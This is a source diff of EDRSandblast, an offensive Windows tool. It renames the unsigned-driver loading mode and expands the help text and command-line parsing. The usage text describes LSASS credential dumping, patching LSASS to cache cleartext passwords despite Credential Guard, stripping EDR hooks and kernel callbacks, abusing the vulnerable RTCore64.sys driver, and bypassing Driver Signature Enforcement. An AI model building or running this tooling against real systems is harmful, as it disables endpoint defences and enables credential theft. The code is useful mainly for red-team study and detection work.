@@ -40,7 +40,7 @@ typedef enum _START_MODE {
     credguard,
     audit,
     firewall,
-    load,
+    load_unsigned_driver,
     none
 } START_MODE;
 
@@ -88,79 +88,100 @@ BOOL WasRestarted() {
 
 int _tmain(int argc, TCHAR** argv) {
     // Parse command line arguments and initialize variables to default values if needed.
-    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall | load> \n\
-[--usermode [--unhook-method <N>] [--direct-syscalls]] [--kernelmode] [--dont-unload-driver] [--no-restore] \n\
-[--driver <RTCore64.sys>] [--service <SERVICE_NAME>] [--nt-offsets <NtoskrnlOffsets.csv>] \n\
-[--wdigest-offsets <WdigestOffsets.csv>] [--add-dll <dll name or path>]* [-o | --dump-output <DUMP_FILE>] \n\
---internet");
+    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall | load_unsigned_driver> \n\
+[--usermode] [--unhook-method <N>] [--direct-syscalls] [--add-dll <dll name or path>]* \n\
+[--kernelmode] [--dont-unload-driver] [--no-restore] \n\
+    [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--ci-offsets <CiOffsets.csv>] [--internet]\n\
+    [--vuln-driver <RTCore64.sys>] [--vuln-service <SERVICE_NAME>] \n\
+    [--unsigned-driver <evil.sys>] [--unsigned-service <SERVICE_NAME>] \n\
+[-o | --dump-output <DUMP_FILE>]\n");
     const TCHAR extendedUsage[] = TEXT("\n\
 -h | --help             Show this help message and exit.\n\
 -v | --verbose          Enable a more verbose output.\n\
 \n\
 Actions mode:\n\
 \n\
-\taudit           Display the user-land hooks and / or Kernel callbacks without taking actions.\n\
-\tdump            Dump the process specified by --process-name (LSASS process by default), as '<process_name>' in the current directory or at the\n\
-\t                specified file using -o | --output <DUMP_FILE>.\n\
-\tcmd             Open a cmd.exe prompt.\n\
-\tcredguard       Patch the LSASS process' memory to enable Wdigest cleartext passwords caching even if\n\
-\t                Credential Guard is enabled on the host. No kernel-land actions required.\n\
-\tfirewall        Add Windows firewall rules to block network access for the EDR processes / services.\n\
-\tload            Load the specified unsigned driver.\n\
+\taudit                     Display the user-land hooks and / or Kernel callbacks without taking actions.\n\
+\tdump                      Dump the process specified by --process-name (LSASS process by default), as '<process_name>' in the current directory or at the\n\
+\t                          specified file using -o | --output <DUMP_FILE>.\n\
+\tcmd                       Open a cmd.exe prompt.\n\
+\tcredguard                 Patch the LSASS process' memory to enable Wdigest cleartext passwords caching even if\n\
+\t                          Credential Guard is enabled on the host. No kernel-land actions required.\n\
+\tfirewall                  Add Windows firewall rules to block network access for the EDR processes / services.\n\
+\tload_unsigned_driver      Load the specified unsigned driver, bypassing Driver Signature Enforcement (DSE).\n\
+\t                          WARNING: currently an experimental feature, only works if KDP is not present and enabled.\n\
 \n\
 --usermode              Perform user-land operations (DLL unhooking).\n\
 --kernelmode            Perform kernel-land operations (Kernel callbacks removal and ETW TI disabling).\n\
 \n\
---unhook-method <N>\n   Choose the userland un-hooking technique, from the following: \n\
 \n\
-\t0               Do not perform any unhooking (used for direct syscalls operations).\n\
-\t1 (Default)     Uses the (probably monitored) NtProtectVirtualMemory function in ntdll to remove all\n\
-\t                present userland hooks.\n\
-\t2               Constructs a 'unhooked' (i.e. unmonitored) version of NtProtectVirtualMemory, by\n\
-\t                allocating an executable trampoline jumping over the hook, and remove all present\n\
-\t                userland hooks.\n\
-\t3               Searches for an existing trampoline allocated by the EDR itself, to get an 'unhooked'\n\
-\t                (i.e. unmonitored) version of NtProtectVirtualMemory, and remove all present userland\n\
-\t                hooks.\n\
-\t4               Loads an additional version of ntdll library into memory, and use the (hopefully\n\
-\t                unmonitored) version of NtProtectVirtualMemory present in this library to remove all\n\
-\t                present userland hooks.\n\
-\t5               Allocates a shellcode that uses a direct syscall to call NtProtectVirtualMemory,\n\
-\t                and uses it to remove all detected hooks\n\
---direct-syscalls       Use direct syscalls to conduct the specified action if possible (for now only for process dump).\n\
+Hooking-related options:\n\
 \n\
-Other options:\n\
+--add-dll <dll name or path>            Loads arbitrary libraries into the process' address space, before starting\n\
+                                        anything.This can be useful to audit userland hooking for DLL that are not\n\
+                                        loaded by default by this program. Use this option multiple times to load\n\
+                                        multiple DLLs all at once.\n\
+                                        Example of interesting DLLs to look at: user32.dll, ole32.dll, crypt32.dll, \n\
+                                        samcli.dll, winhttp.dll, urlmon.dll, secur32.dll, shell32.dll...\n\
+\n\
+--unhook-method <N>                     Choose the userland un-hooking technique, from the following: \n\
+\n\
+\t0                               Do not perform any unhooking (used for direct syscalls operations).\n\
+\t1 (Default)                     Uses the (probably monitored) NtProtectVirtualMemory function in ntdll to remove all\n\
+\t                                present userland hooks.\n\
+\t2                               Constructs a 'unhooked' (i.e. unmonitored) version of NtProtectVirtualMemory, by\n\
+\t                                allocating an executable trampoline jumping over the hook, and remove all present\n\
+\t                                userland hooks.\n\
+\t3                               Searches for an existing trampoline allocated by the EDR itself, to get an 'unhooked'\n\
+\t                                (i.e. unmonitored) version of NtProtectVirtualMemory, and remove all present userland\n\
+\t                                hooks.\n\
+\t4                               Loads an additional version of ntdll library into memory, and use the (hopefully\n\
+\t                                unmonitored) version of NtProtectVirtualMemory present in this library to remove all\n\
+\t                                present userland hooks.\n\
+\t5                               Allocates a shellcode that uses a direct syscall to call NtProtectVirtualMemory,\n\
+\t                                and uses it to remove all detected hooks\n\
+\n\
+--direct-syscalls       Use direct syscalls to dump the selected process memory without unhooking unserland hooks.\n\
+\n\
+\n\
+BYOVD options:\n\
 \n\
 --dont-unload-driver                    Keep the vulnerable driver installed on the host\n\
                                         Default to automatically unsinstall the driver.\n\
 --no-restore                            Do not restore the EDR drivers' Kernel Callbacks that were removed.\n\
                                         Default to restore the callbacks.\n\
+--vuln-driver <") DEFAULT_DRIVER_FILE TEXT(">\t\tPath to the vulnerable driver file.\n\
+                                        Default to '") DEFAULT_DRIVER_FILE TEXT("' in the current directory.\n\
+--vuln-service <SERVICE_NAME>           Name of the vulnerable service to intall / start.\n\
 \n\
---driver <RTCore64.sys>                 Path to the Micro-Star MSI Afterburner vulnerable driver file.\n\
-                                        Default to 'RTCore64.sys' in the current directory.\n\
+\n\
+Driver sideloading options:\n\
+\n\
 --unsigned-driver <evil.sys>            Path to the unsigned driver file.\n\
                                         Default to 'evil.sys' in the current directory.\n\
---service <SERVICE_NAME>                Name of the vulnerable service to intall / start.\n\
+--unsigned-service <SERVICE_NAME>       Name of the unsigned driver's service to intall / start.\n\
+\n\
+\n\
+Offset-related options:\n\
 \n\
 --nt-offsets <NtoskrnlOffsets.csv>      Path to the CSV file containing the required ntoskrnl.exe's offsets.\n\
                                         Default to 'NtoskrnlOffsets.csv' in the current directory.\n\
 --wdigest-offsets <WdigestOffsets.csv>  Path to the CSV file containing the required wdigest.dll's offsets\n\
                                         (only for the 'credguard' mode).\n\
                                         Default to 'WdigestOffsets.csv' in the current directory.\n\
-\n\
---add-dll <dll name or path>            Loads arbitrary libraries into the process' address space, before starting\n\
-                                        anything. This can be useful to audit userland hooking for DLL that are not\n\
-                                        loaded by default by this program. Use this option multiple times to load\n\
-                                        multiple DLLs all at once.\n\
-                                        Example of interesting DLLs to look at: user32.dll, ole32.dll, crypt32.dll,\n\
-                                        samcli.dll, winhttp.dll, urlmon.dll, secur32.dll, shell32.dll...\n\
-\n\
--o | --output <DUMP_FILE>               Output path to the dump file that will be generated by the 'dump' mode.\n\
-                                        Default to 'process_name' in the current directory.\n\
-\
+--ci-offsets <CiOffsets.csv>            Path to the CSV file containing the required ci.dll's offsets\n\
+                                        (only for the 'load_unsigned_driver' mode).\n\
+                                        Default to 'WdigestOffsets.csv' in the current directory.\n\
 -i | --internet                         Enables automatic symbols download from Microsoft Symbol Server\n\
                                         If a corresponding *Offsets.csv file exists, appends the downloaded offsets to the file for later use\n\
-                                        OpSec warning: downloads and drops on disk a PDB file for ntoskrnl.exe and/or wdigest.dll\n");
+                                        OpSec warning: downloads and drops on disk a PDB file for the corresponding image\n\
+\n\
+Dump options:\n\
+\n\
+-o | --dump-output <DUMP_FILE>          Output path to the dump file that will be generated by the 'dump' mode.\n\
+                                        Default to 'process_name' in the current directory.\n\
+--process-name <NAME>                   File name of the process to dump (defaults to 'lsass.exe')\
+");
 
     BOOL status;
     HRESULT hrStatus = S_OK;
@@ -179,7 +200,7 @@ Other options:\n\
     TCHAR evilDriverDefaultName[] = DEFAULT_EVIL_DRIVER_FILE;
     TCHAR ntoskrnlOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR wdigestOffsetCSVPath[MAX_PATH] = { 0 };
-    TCHAR CiOffsetCSVPath[MAX_PATH] = { 0 };
+    TCHAR ciOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR processName[] = TEXT("lsass.exe");
     TCHAR outputPath[MAX_PATH] = { 0 };
     BOOL verbose = FALSE;
@@ -215,8 +236,8 @@ Other options:\n\
         else if (_tcsicmp(argv[i], TEXT("firewall")) == 0) {
             startMode = firewall;
         }
-        else if (_tcsicmp(argv[i], TEXT("load")) == 0) {
-            startMode = load;
+        else if (_tcsicmp(argv[i], TEXT("load_unsigned_driver")) == 0) {
+            startMode = load_unsigned_driver;
         }
         else if (_tcsicmp(argv[i], TEXT("-h")) == 0 || _tcsicmp(argv[i], TEXT("--help")) == 0) {
             _putts_or_not(usage);
@@ -238,7 +259,7 @@ Other options:\n\
         else if (_tcsicmp(argv[i], TEXT("--no-restore")) == 0) {
             restoreCallbacks = FALSE;
         }
-        else if (_tcsicmp(argv[i], TEXT("--driver")) == 0) {
+        else if (_tcsicmp(argv[i], TEXT("--vuln-driver")) == 0 || _tcsicmp(argv[i], TEXT("--driver")) == 0) {
             i++;
             if (i > argc) {
                 _tprintf_or_not(TEXT("%s"), usage);
@@ -254,13 +275,21 @@ Other options:\n\
             }
             _tcsncpy_s(unsignedDriverPath, _countof(unsignedDriverPath), argv[i], _tcslen(argv[i]));
         }
-        else if (_tcsicmp(argv[i], TEXT("--service")) == 0) {
+        else if (_tcsicmp(argv[i], TEXT("--vuln-service")) == 0 || _tcsicmp(argv[i], TEXT("--service")) == 0) {
             i++;
             if (i > argc) {
                 _tprintf_or_not(TEXT("%s"), usage);
                 return EXIT_FAILURE;
             }
             SetDriverServiceName(argv[i]);
+        }
+        else if (_tcsicmp(argv[i], TEXT("--unsigned-service")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            SetEvilDriverServiceName(argv[i]);
         }
         else if (_tcsicmp(argv[i], TEXT("--nt-offsets")) == 0) {
             i++;
@@ -277,6 +306,14 @@ Other options:\n\
                 return EXIT_FAILURE;
             }
             _tcsncpy_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), argv[i], _tcslen(argv[i]));
+        }
+        else if (_tcsicmp(argv[i], TEXT("--ci-offsets")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            _tcsncpy_s(ciOffsetCSVPath, _countof(ciOffsetCSVPath), argv[i], _tcslen(argv[i]));
         }
         else if (_tcsicmp(argv[i], TEXT("-o")) == 0 || _tcsicmp(argv[i], TEXT("--dump-output")) == 0) {
             i++;
@@ -355,8 +392,8 @@ Other options:\n\
     if (startMode == dump && !kernelMode) {
         _putts_or_not(TEXT("[!] LSASS dump might fail if RunAsPPL is enabled. Enable --kernelmode to bypass PPL\n"));
     }
-    if (startMode == load && !kernelMode) {
-        _putts_or_not(TEXT("'load' mode needs kernel-land DSE disabling operation to work, please enable --kernelmode"));
+    if (startMode == load_unsigned_driver && !kernelMode) {
+        _putts_or_not(TEXT("'load_unsigned_driver' mode needs kernel-land DSE disabling operation to work, please enable --kernelmode"));
         return EXIT_FAILURE;
     }
     // TODO: set isSafeToExecutePayloadUserland by unhook to TRUE / FALSE if there are still hooks.
@@ -670,22 +707,22 @@ Other options:\n\
                 break;
             }
             // Load an unsigned kernel driver.
-            case load:
+            case load_unsigned_driver:
             {
-                if (_tcslen(CiOffsetCSVPath) == 0) {
+                if (_tcslen(ciOffsetCSVPath) == 0) {
                     TCHAR CiOffsetCSVName[] = TEXT("\\CiOffsets.csv");
-                    _tcsncat_s(CiOffsetCSVPath, _countof(CiOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
-                    _tcsncat_s(CiOffsetCSVPath, _countof(CiOffsetCSVPath), CiOffsetCSVName, _countof(CiOffsetCSVName));
+                    _tcsncat_s(ciOffsetCSVPath, _countof(ciOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
+                    _tcsncat_s(ciOffsetCSVPath, _countof(ciOffsetCSVPath), CiOffsetCSVName, _countof(CiOffsetCSVName));
                 }
 
-                if (FileExists(CiOffsetCSVPath)) {
-                    LoadCiOffsetsFromFile(CiOffsetCSVPath);
+                if (FileExists(ciOffsetCSVPath)) {
+                    LoadCiOffsetsFromFile(ciOffsetCSVPath);
                     if (g_ciOffsets.st.g_CiOptions == 0x0) {
                         _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of ci in use."));
                     }
                     else {
                         if (verbose) {
-                            _tprintf_or_not(TEXT("[+] g_CiOptions offset found using %s file : 0x%llx\n"), CiOffsetCSVPath, g_ciOffsets.st.g_CiOptions);
+                            _tprintf_or_not(TEXT("[+] g_CiOptions offset found using %s file : 0x%llx\n"), ciOffsetCSVPath, g_ciOffsets.st.g_CiOptions);
                         }
                     }
                 }
@@ -703,9 +740,9 @@ Other options:\n\
                     }
                     else {
                         _putts_or_not(TEXT("[+] Downloading offsets succeeded !"));
-                        if (FileExists(CiOffsetCSVPath)) {
+                        if (FileExists(ciOffsetCSVPath)) {
                             _putts_or_not(TEXT("[+] Saving them to the CSV file..."));
-                            SaveCiOffsetsToFile(CiOffsetCSVPath);
+                            SaveCiOffsetsToFile(ciOffsetCSVPath);
                         }
                     }
                     if (verbose) {
